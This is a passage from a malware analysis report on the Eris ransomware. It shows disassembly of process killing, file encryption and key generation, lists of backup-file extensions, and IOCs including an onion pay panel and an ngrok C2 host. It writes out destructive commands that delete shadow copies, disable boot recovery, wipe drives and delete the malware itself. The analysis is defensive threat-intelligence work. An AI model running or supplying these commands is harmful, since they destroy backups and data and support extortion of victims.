mov dword [esp], eax
call fcn.runtime.newobject
mov eax, dword [var_4h]
mov dword [var_48h], eax
mov dword [eax], 0x22c
lea ecx, sym.type._2_uintptr
mov dword [esp], ecx
call fcn.runtime.newobject
mov eax, dword [var_4h]
mov ecx, dword [var_34h]
mov dword [eax], ecx
mov edx, dword [var_48h]
mov dword [eax + 4], edx
mov edx, dword [sym.pProcess32FirstW]
mov dword [esp], edx
mov dword [var_4h], eax
mov dword [var_8h], 2
mov dword [var_ch], 2
call fcn.syscall___LazyProc_.Call
mov eax, dword [var_10h]

If any of the running processes name contain any of the strings below, it is killed.
sql
19/27

backup
malware
server
http
apache
agent
Code for killing the processes:

20/27

0x005fecdc
0x005fece3
0x005fece5
0x005feceb
0x005fecf2
0x005fecf5
0x005fecf7
0x005fecfe
0x005fed01
0x005fed08
0x005fed0b
0x005fed0e
0x005fed10
0x005fed14
0x005fed18
0x005fed1b
0x005fed1f
0x005fed25
0x005fed2b
0x005fed31
0x005fed35
0x005fed39
0x005fed3d
0x005fed42
0x005fed47
0x005fed49
0x005fed4b
0x005fed52
0x005fed55
0x005fed5c
0x005fed5f
0x005fed61
0x005fed62
0x005fed66
0x005fed69
0x005fed6e
0x005fed72
0x005fed76
0x005fed78
0x005fed7e
0x005fed7f
0x005fed80
0x005fed81
0x005fed87
0x005fed8d
0x005fed90
0x005fed94
0x005fed98

mov ecx, dword [slice_procs]
cmp edx, ecx
jge 0x5fe90b
mov dword [var_d4h], edx
lea ecx, [eax + edx*8]
mov ebx, dword [ecx]
mov dword [var_a4h], ebx
mov ecx, dword [ecx + 4]
mov dword [var_150h], ecx
mov ebp, dword [ebx + 0x10]
mov dword [esp], ecx
call ebp
mov eax, dword [var_4h]
mov ecx, dword [var_8h]
mov dword [esp], eax
mov dword [var_4h], ecx
mov eax, dword [0x874b38] ; List of strings
mov ecx, dword [0x874b3c] ; 7
mov edx, dword [0x874b40] ; 7
mov dword [var_8h], eax
mov dword [var_ch], ecx
mov dword [var_10h], edx
call fcn.Eris_Utils.Contains
movzx eax, byte [var_14h]
test al, al
je 0x5feccb
mov eax, dword [var_a4h]
mov eax, dword [eax + 0x18]
mov ecx, dword [var_150h]
mov dword [esp], ecx
call eax
nop
mov eax, dword [var_4h]
mov dword [esp], eax
call fcn.os.findProcess
mov eax, dword [var_4h]
mov ecx, dword [var_8h]
test ecx, ecx
jne 0x5feccb
nop
nop
nop
mov ecx, dword [0x874a48]
mov edx, dword [0x874a4c]
mov dword [esp], eax
mov dword [var_4h], ecx
mov dword [var_8h], edx
call fcn.os___Process_.signal

Release of IP address
If the username ends with $, the IP address for the machine is released:

21/27

0x005fe90b
0x005fe911
0x005fe914
0x005fe91c
0x005fe921
0x005fe925
0x005fe929
0x005fe92c
0x005fe92e
0x005fe934
0x005fe93b
0x005fe93d
0x005fe944
0x005fe946
0x005fe948
0x005fe94b
0x005fe94d
0x005fe954
0x005fe957
0x005fe959
0x005fe95d
0x005fe960
...
0x005fec2d
0x005fec38
0x005fec43
0x005fec49
0x005fec50
0x005fec56
0x005fec5d
0x005fec63
0x005fec66
0x005fec6e
0x005fec75
0x005fec79
0x005fec81
0x005fec89
0x005fec8e
0x005fec92
0x005fec96
0x005fec9c
0x005fec9f
0x005feca7
0x005fecab
0x005fecaf
0x005fecb4

lea eax, [0x67505a] ; "USERNAME"
mov dword [esp], eax
mov dword [var_4h], 8
call fcn.os.Getenv
mov eax, dword [var_8h]
mov ecx, dword [var_ch]
lea edx, [ecx - 1]
cmp edx, ecx
ja 0x5ff6a5
mov dword [username_str], eax
sub ecx, edx
mov dword [username_str_len], ecx
mov ebx, ecx
neg ecx
sar ecx, 0x1f
and edx, ecx
mov dword [var_d0h], edx
cmp ebx, 1
jne 0x5fe966
movzx ecx, byte [edx + eax]
cmp cl, 0x24 ; "$"
je 0x5fec2d
mov dword [var_190h], 0
mov dword [var_194h], 0
lea eax, sym.type.string
mov dword [var_190h], eax
lea ecx, [0x6cecb0] ; "ipconfig /release"
mov dword [var_194h], ecx
lea ecx, [0x674630] ; "/C %s"
mov dword [esp], ecx
mov dword [var_4h], 5
lea edx, [var_190h]
mov dword [var_8h], edx
mov dword [var_ch], 1
mov dword [var_10h], 1
call fcn.fmt.Sprintf
mov eax, dword [var_14h]
mov ecx, dword [var_18h]
lea edx, [0x674d1b] ; "cmd.exec"
mov dword [esp], edx
mov dword [var_4h], 7
mov dword [var_8h], eax
mov dword [var_ch], ecx
call fcn.Eris_Utils.Execute
jmp 0x5fe966

Encrypting files
The malware walks all the disks and encrypts the files. It can perform this process
“multithreaded” if a command line flag is given. In this case, it uses one Go routine for each
drive. The malware skips any folders containing the following strings:
windows
22/27

windows.old
system volume information
$recycle.bin
program files
program files (x86)
programdata
i386
amd64
sysvol
It also skip the following files:
autoexec.bat
boot.ini
ntdetect.com
msdos.sys
io.sys
pagefile.sys
ntldr
config.sys
ntuser.dat
If the file has _FLAG_ENCRYPTED_ at the end of the file, it is skipped.
Eris overwrites and deletes backup files with the following file extensions:
$$$, $db, 001, 001, 002, 003, 113, 73b, __a, __b, ab, aba, abbu, abf, abk, abu, abu1,
acp, acr, adi, adi, aea, afi, arc, arc, as4, asd, ashbak, asv, asvx, ate, ati, ba6,
ba7, ba8, bac, backup, backupdb, bak, bak, bak, bak, bak, bak2, bak3, bakx, bak~,
bbb, bbz, bck, bckp, bcm, bdb, bff, bif, bifx, bk1, bk1, bkc, bkf, bkp, bkp, bkup,
bkz, blend1, blend2, bm3, bmk, bookexport, bpa, bpb, bpm, bpn, bps, bup, bup, caa,
cbk, cbs, cbu, cenon~, ck9, cmf, crds, csd, csm, da0, dash, dba, dbk, dbk, dim, diy,
dna, dov, dpb, dsb, dss, fbc, fbf, fbk, fbk, fbu, fbw, fh, fhf, flka, flkb, fpsx,
ftmb, ful, fwbackup, fza, fzb, gb1, gb2, gbp, gho, ghs, gs-bck, ibk, icbu, icf,
inprogress, ipd, iv2i, j01, jbk, jdc, jpa, jps, kb2, lbf, lcb, llx, mbf, mbk, mbw,
mdbackup, mddata, mdinfo, mem, mig, mpb, msim, mv_, mynotesbackup, nb7, nba, nbak,
nbd, nbd, nbf, nbf, nbi, nbk, nbk, nbs, nbu, nco, nda, nfb, nfc, noy, npf, nps,
nrbak, nrs, nwbak, obk, oeb, old, onepkg, ori, orig, oyx, paq, pba, pbb, pbd, pbf,
pbf, pbj, pbx5script, pbxscript, pdb, pfi, pqb, pqb-backup, prv, psa, ptb, pvc, pvhd,
qba.tlg, qbb, qbk, qbm, qbmb, qbmd, qbx, qic, qsf, qualsoftcode, quicken2015backup,
quicken2016backup, quicken2017backup, quickenbackup, qv~, rbc, rbf, rbf, rbf, rbk,
rbs, rdb, rgmb, rmbak, rrr, safenotebackup, sav, sbb, sbs, sbu, sdc, sim, sis, skb,
sme, sn1, sn2, sna, sns, spf, spg, spi, sps, sqb, srr, stg, sv$, sv2i, tbk, tdb,
tibkp, tib, tig, tis, tlg, tmp, tmp, tmr, trn, ttbk, uci, v2i, vbk, vbm, vbox-prev,
vpcbackup, vrb, w01, walletx, wbb, wbcat, wbk, win, win, wjf, wpb, wspak, wx, xbk,
xlk, yrcbck, zbfx, ~cw, vib, vkb

23/27

For each file a key is generated using PBKDF2. A random password is used with the salt of
[0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8] and 1000 iterations. The key is encrypted with the
victim’s public key:
0x0053fc13
0x0053fc19
0x0053fc1f
0x0053fc22
0x0053fc26
0x0053fc2a
0x0053fc32
0x0053fc3a
0x0053fc42
0x0053fc47
0x0053fc48
0x0053fc4e
0x0053fc51
0x0053fc56
0x0053fc5a
0x0053fc60
0x0053fc66
0x0053fc68
0x0053fc6b
0x0053fc72
0x0053fc75
0x0053fc7d
0x0053fc85
0x0053fc89
0x0053fc91
0x0053fc99
0x0053fca1
0x0053fca9
0x0053fcaf
0x0053fcb3
0x0053fcb8
0x0053fcbc
0x0053fcc3
0x0053fcc7
0x0053fccb
0x0053fccf
0x0053fcd3
0x0053fcda
0x0053fcdd
0x0053fce5
0x0053fced
0x0053fcf4
0x0053fcf8
0x0053fcff
0x0053fd03
0x0053fd0a
0x0053fd0e

mov ecx, dword [0x87a654] ; rngReader from crypto/rand package
mov edx, dword [0x87a650]
mov dword [esp], edx
mov dword [var_4h], ecx
mov dword [var_8h], eax
mov dword [var_ch], 0x20 ; 32
mov dword [var_10h], 0x20 ; 32
mov dword [var_14h], 0x20 ; 32
call fcn.io.ReadAtLeast
nop
lea eax, sym.type._8_uint8
mov dword [esp], eax
call fcn.runtime.newobject
mov eax, dword [var_4h]
mov ecx, dword [0x6ce388]
mov edx, dword [0x6ce38c]
mov dword [eax], ecx
mov dword [eax + 4], edx
mov ecx, dword [var_12ch]
mov dword [esp], ecx
mov dword [var_4h], 0x20
mov dword [var_8h], 0x20
mov dword [var_ch], eax
mov dword [var_10h], 8
mov dword [var_14h], 8
mov dword [var_18h], 0x3e8 ; 1000
mov dword [var_1ch], 8
lea eax, [0x68ae74]
mov dword [var_20h], eax
call fcn.golang.org_x_crypto_pbkdf2.Key
mov eax, dword [var_24h]
mov dword [var_108h], eax
mov ecx, dword [var_2ch]
mov dword [var_34h], ecx
mov edx, dword [var_28h]
mov dword [var_30h], edx
mov ebx, dword [var_12ch]
mov dword [esp], ebx
mov dword [var_4h], 0x20
mov dword [var_8h], 0x20
mov ebp, dword [arg_13ch]
mov dword [var_ch], ebp
mov ebp, dword [arg_140h]
mov dword [var_10h], ebp
mov ebp, dword [arg_144h]
mov dword [var_14h], ebp
call fcn.Eris_Cryptography.RSAEncrypt

The file is encrypted with Salsa20 using the generated key for the file.

24/27

=== Preventing recovery ===
After encryption of the files, the following commands are executed:
taskkill.exe /f /im mysqld.exe
taskkill.exe /f /im sqlwriter.exe
taskkill.exe /f /im sqlserver.exe
taskkill.exe /f /im MSExchange*
taskkill.exe /f /im Microsoft.Exchange.*
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
wbadmin delete catalog -quiet
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no

Code for executing the commands:
0x005fe9a6
0x005fe9a8
0x005fe9ad
0x005fe9b4
0x005fe9bb
0x005fe9bd
0x005fe9c0
0x005fe9c3
0x005fe9c7
0x005fe9cc
0x005fe9d0
0x005fe9db
0x005fe9e6
0x005fe9ec
0x005fe9f3
0x005fe9fa
0x005fea00
0x005fea03
0x005fea0b
0x005fea12
0x005fea16
0x005fea1e
0x005fea26
0x005fea2b
0x005fea2f
0x005fea33
0x005fea39
0x005fea3c
0x005fea44
0x005fea48
0x005fea4c
0x005fea51
0x005fea58
0x005fea59
0x005fea5c

xor eax, eax
jmp 0x5fea59
mov dword [var_cch], eax
lea ecx, [esp + eax*8 + 0x200]
mov edx, dword [ecx]
mov ecx, dword [ecx + 4]
mov dword [esp], edx
mov dword [var_4h], ecx
call fcn.runtime.convTstring
mov eax, dword [var_8h]
mov dword [var_190h], 0
mov dword [var_194h], 0
lea ecx, sym.type.string
mov dword [var_190h], ecx
mov dword [var_194h], eax
lea eax, [0x674630] ; "/C %s"
mov dword [esp], eax
mov dword [var_4h], 5
lea edx, [var_190h]
mov dword [var_8h], edx
mov dword [var_ch], 1
mov dword [var_10h], 1
call fcn.fmt.Sprintf
mov eax, dword [var_14h]
mov ecx, dword [var_18h]
lea edx, [0x674d1b] ; "cmd.exe"
mov dword [esp], edx
mov dword [var_4h], 7
mov dword [var_8h], eax
mov dword [var_ch], ecx
call fcn.Eris_Utils.Execute
mov eax, dword [var_cch]
inc eax
cmp eax, 0xa ; 10
jl 0x5fe9ad

25/27

For each drive letter, the malware executes /C cipher /W:%DRIVE_LETTER%: to perform a
secure wipe.
0x005fea62
0x005fea67
0x005fea6a
0x005fea71
0x005fea75
0x005fea7c
0x005fea7e
0x005fea83
0x005fea8a
0x005fea8d
0x005fea95
0x005fea9a
0x005fea9e
0x005feaa2
0x005feaa5
0x005feaa9
0x005feaae
0x005feab2
0x005feabd
0x005feac8
0x005feace
0x005fead5
0x005feadc
0x005feae2
0x005feae5
0x005feaed
0x005feaf4
0x005feaf8
0x005feb00
0x005feb08
0x005feb0d
0x005feb11
0x005feb15
0x005feb1b
0x005feb1e
0x005feb26
0x005feb2a
0x005feb2e

call fcn.Eris_Utils.GetDrive
mov eax, dword [esp]
mov dword [var_16ch], eax
mov ecx, dword [var_4h]
mov dword [var_bch], ecx
xor edx, edx
jmp 0x5feb54
mov dword [var_cch], edx
mov dword [esp], ebp
mov dword [var_4h], 1
call fcn.strings.ToUpper
mov eax, dword [var_8h]
mov ecx, dword [var_ch]
mov dword [esp], eax
mov dword [var_4h], ecx
call fcn.runtime.convTstring
mov eax, dword [var_8h]
mov dword [var_190h], 0
mov dword [var_194h], 0
lea ecx, sym.type.string
mov dword [var_190h], ecx
mov dword [var_194h], eax
lea eax, [0x6775d1] ; "/C cipher /W:%s:"
mov dword [esp], eax
mov dword [var_4h], 0x10
lea edx, [var_190h]
mov dword [var_8h], edx
mov dword [var_ch], 1
mov dword [var_10h], 1
call fcn.fmt.Sprintf
mov eax, dword [var_14h]
mov ecx, dword [var_18h]
lea edx, [0x674d1b] ; "cmd.exe"
mov dword [esp], edx
mov dword [var_4h], 7
mov dword [var_8h], eax
mov dword [var_ch], ecx
call fcn.Eris_Utils.Execute

Self-removal
Finally the malware spawns a new process and exits. The spawned process first pings
localhost to create a delay before it deletes the malware’s binary file.
%WINDIR%\system32\cmd.exe /C ping 127.0.0.1 -n 3 > NUL && del /Q /F "%ERIS_FILE%"

IOCs
Pay panel
26/27

epaybfvlutydks6fpfwtwoe2fsph6vve2obgv6qbhyuqwkecbhsf7nyd.onion

C2
d9d120a3.ngrok.io

Hashes
2c7f9fbfd5421406bc88b62a70a570eada14d4a561689125dc8f3ef30e3afc91
33f54f227c26c5abdbe5e0f994082d5b89e1df145deef703948aeb268637d9ba
35fb8b1f9966d7d371cb4d513e3d63655c2357be8ef156850fe8927b13007c9e
48da454be70e5f12c359965cfb55cbe5f272ddc378ae9f08876faf1b510c21b6
99d19dd82330a1c437a64e7ca9896ad9d914de10c4f7aa2222b1a5bc4750f692
d0d6fdd6ce8eccf722c8ee72485ae96c2fe0e2fe9e451c94454f1e8be9d9283b
dcdf47ddca1c5f4f9bdd8528bc3e22031fbfd326ad0b4abc11e153bbd79363ec
Download STIX 2 bundle or MISP package here.

27/27